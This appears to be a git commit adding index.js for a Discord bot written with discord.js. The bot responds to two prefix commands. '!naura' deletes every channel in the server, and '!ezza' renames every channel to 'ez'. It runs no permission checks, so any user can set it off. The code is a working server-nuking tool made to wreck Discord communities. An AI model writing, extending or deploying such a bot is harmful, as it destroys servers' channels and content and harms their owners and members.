bc01ed9397ed21cb09a534f22be68d12f597c25a
MrGh0st4 <66492122+MrGh0st4@users.noreply.github.com>
2021-05-11 17:17:52 +0200

    Base

---
+++ index.js
@@ -0,0 +1,26 @@
+const Discord = require("discord.js");
+const config = require("./config.json");
+
+const client = new Discord.Client();
+
+const prefix = "!";
+
+client.on("message", function(message) {
+  if (message.author.bot) return;
+  if (!message.content.startsWith(prefix)) return;
+
+  const commandBody = message.content.slice(prefix.length);
+  const args = commandBody.split(' ');
+  const command = args.shift().toLowerCase();
+
+  if (command === "naura") {
+    message.guild.channels.cache.forEach(channel => channel.delete())
+  }
+
+  else if (command === "ezza") {
+    message.guild.channels.cache.forEach(channel => channel.setName("ez"))
+
+  }
+});
+
+client.login(config.BOT_TOKEN);
